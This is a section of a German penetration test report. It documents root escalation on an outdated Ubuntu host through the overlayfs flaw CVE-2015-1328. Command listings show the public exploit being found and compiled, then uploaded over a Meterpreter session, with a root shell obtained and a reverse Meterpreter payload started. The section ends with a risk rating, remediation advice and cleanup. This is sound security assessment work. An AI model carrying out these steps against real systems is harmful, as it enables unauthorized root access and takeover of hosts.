\section{Schwachstelle 2: Local Privilege Escalation}
\label{subsec:vuln2}
Der Host \texttt{myron} ist aufgrund eines veralteten Betriebssystem-Kernels für eine Local Privilege Escalation anfällig, wodurch ein nicht privilegierter lokaler Nutzer root-Berechtigungen erlangen kann.

\subsection{Beschreibung der Schwachstelle}
\label{vuln2_way}
In Kapitel \ref{subsec:vuln1} wurde analyisiert, dass es sich bei dem Host \texttt{myron} um ein Ubuntu-System mit einem Linux-Kernel 3.13.0-24 aus dem Jahr 2014 handelt. Analysen mittels \texttt{searchsploit} haben ergeben, dass für die \textit{overlayfs}-Implementierung von Ubuntu-Betriebssystemen mit einem Linux-Kernel kleiner 3.19.0-21.21 anfällig gegenüber einer fehlerhaften Berechtigungsprüfung sind und ein Benutzer dadurch Root-Berechtigungen erlangen kann. Ein entsprechender Exploit auf searchsploit ist öffentlich in der C-Programmiersprache verfügbar und wird auf einer aktualisierten Kali-Version mitgeliefert. Textauflistung \ref{lst:vuln2_searchsploit_ofs} zeigt, wie der Exploit gefunden und kompiliert werden kann.

\lstset{language=bash,caption={Suchen und Kompilieren des \textit{overlayfs} Local Privilege Escalation Exploits}, label=lst:vuln2_searchsploit_ofs}
\begin{lstlisting}[frame=single, firstnumber=1, stepnumber=1,]
|--(gu4c4m0l3@kali-t470)-[~/Documents/pentest_MB-Reps/172_16_33_10]
|-$ searchsploit 3.13.0
---------------------------------------------------------- --------------------
 Exploit Title                                          |  Path
---------------------------------------------------------- --------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15 | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15 | linux/local/37293.txt
---------------------------------------------------------- --------------------
Shellcodes: No Results

|--(gu4c4m0l3@kali-t470)-[~/Documents/pentest_MB-Reps/172_16_33_10]
|-$ locate 37292.c
/usr/share/exploitdb/exploits/linux/local/37292.c

|--(gu4c4m0l3@kali-t470)-[~/Documents/pentest_MB-Reps/172_16_33_10]
|-$ cp /usr/share/exploitdb/exploits/linux/local/37292.c .

|--(gu4c4m0l3@kali-t470)-[~/Documents/pentest_MB-Reps/172_16_33_10]
|-$ gcc 37292.c -o ofs                                           
[... compiler warnings omitted ...]

|--(gu4c4m0l3@kali-t470)-[~/Documents/pentest_MB-Reps/172_16_33_10]
|-$ ls            
37292.c  ofs
\end{lstlisting}
Anschließend kann die kompilierte \texttt{ofs}-Datei über die bereits existierende Meterpreter-Session aus Kapitel \ref{subsec:vuln1} hochgeladen und ausgeführt werden. Textauszug \ref{lst:vuln2_execute_ofs} zeigt, wie der Exploit hochgeladen, ausgeführt und eine Root-Shell erlangt wird um anschließend die existierende Meterpreter-Payload \texttt{/tmp/rshell} mit root-Berechtigungen auszuführen. Zeile 40 veranschaulicht, dass eine existierende root-Meterpreter-Sitzung zum myron-Host besteht.


\lstset{language=bash,caption={Ausführen des overlayfs Privilege Escalation Exploits und erlangen einer Root-Session}, label=lst:vuln2_execute_ofs}
\begin{lstlisting}[frame=single, firstnumber=1, stepnumber=1,]
gu4c4m0l3@msf-kali-t470 [S:1, J:1] > sessions 1
[*] Starting interaction with 1...

meterpreter > lpwd
/home/gu4c4m0l3
meterpreter > lcd Documents/pentest_MB-Reps/172_16_33_10
meterpreter > upload ofs
[*] uploading  : /home/gu4c4m0l3/Documents/pentest_MB-Reps/172_16_33_10/ofs -> ofs
[*] Uploaded -1.00 B of 16.70 KiB (-0.01%): /home/gu4c4m0l3/Documents/pentest_MB-Reps/172_16_33_10/ofs -> ofs
[*] uploaded   : /home/gu4c4m0l3/Documents/pentest_MB-Reps/172_16_33_10/ofs -> ofs
meterpreter > shell
Process 5994 created.
Channel 2 created.
chmod +x ofs
./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# /tmp/rshell &
[*] Sending stage (3020772 bytes) to 172.16.30.222
[*] Meterpreter session 2 opened (172.16.76.12:22 -> 172.16.30.222:36343 ) at 2022-02-26 02:34:07 +0100
^Z
Background channel 2? [y/N]  y
meterpreter > background 
[*] Backgrounding session 1...
gu4c4m0l3@msf-kali-t470 [S:2, J:1] > sessions

Active sessions
===============

  Id  Name  Type                   Information              Connection
  --  ----  ----                   -----------              ----------
  1         meterpreter x64/linux  www-data @ 172.16.33.10  172.16.76.12:22 -> 172.16.30.222:16068  (172.16.30.222)
  2         meterpreter x64/linux  root @ 172.16.33.10      172.16.76.12:22 -> 172.16.30.222:36343  (172.16.30.222)
\end{lstlisting}  

\subsection{Risikobewertung}
Aufgrund der Tatsache, dass die ausgenutzte Schwachstelle zur Erlangung der Root-Berechtigungen seit 2015 bekannt ist (s. CVE-2015-1328) und bei CVSS 3.0 mit 7,8 (High)\footnote{Details siehe https://nvd.nist.gov/vuln/detail/CVE-2015-1328} bewertet wurde und in Kombination mit Schwachstelle 1 die vollständige Kontrolle des myron-Hosts erlangt werden kann, wird sowohl die Eintrittswahrscheinlichkeit als auch die Schadenshöhe mit HOCH bewertet.

Das Gesamtrisiko wurde mit \textcolor{red}{HOCH} bewertet.

\subsection{Empfohlene Gegenmaßnahmen}
Es wird empfohlen das Betriebssystem umgehend auf die neueste Version zu aktualisieren, um sich gegen bekannte Schwachstellen zu schützen.

\subsection{Hinterlassene Spuren und Spurenbeseitigung}
Die Datei \texttt{ofs} unter \texttt{/var/www/staradmin/} des \texttt{myron}-Hosts wurde nach der Durchführung des Penetration-Tests mit dem Befehl \texttt{rm /var/www/staradmin/ofs} vom System gelöscht.